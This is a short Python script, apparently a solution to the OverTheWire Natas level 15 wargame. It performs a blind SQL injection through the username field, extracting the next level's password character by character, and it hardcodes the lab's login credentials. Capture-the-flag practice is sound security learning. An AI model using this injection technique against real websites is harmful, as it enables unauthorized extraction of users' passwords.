import requests

chars= "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
password= ""
#url = input('enter you URL: ')
url="http://natas15.natas.labs.overthewire.org/"
basic_user= "natas15"
basic_pass= "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB"

while len(password) <= 32:
    for testing in chars:
        #print('testing character ' + testing)
        resp = requests.post(url, data={"username": 'natas16" and password LIKE binary"' + password + testing + '%%" -- ' }, auth=(basic_user, basic_pass))
        if "This user exists" in resp.text:
            password += testing
            print (password)
            break
